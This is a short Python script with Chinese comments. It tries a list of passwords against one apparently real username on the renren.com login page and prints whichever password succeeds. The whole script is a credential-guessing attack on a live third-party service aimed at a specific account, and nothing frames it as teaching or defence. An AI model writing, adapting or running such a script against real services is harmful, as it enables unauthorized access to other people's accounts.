import requests

# 定义登录 URL 和用户信息
login_url = 'http://www.renren.com/login?to=http%3A%2F%2Fwww.renren.com%2F'
username = '1165645958'
password_list = ['5203443', '24nmuiojik', '520809Pan']

# 使用循环尝试每个密码
for password in password_list:
    # 构造登录请求
    data = {'username': username, 'password': password}
    response = requests.post(login_url, data=data)

    # 判断登录是否成功
    if 'Success' in response.text:
        print('登录成功！密码是：' + password)
        break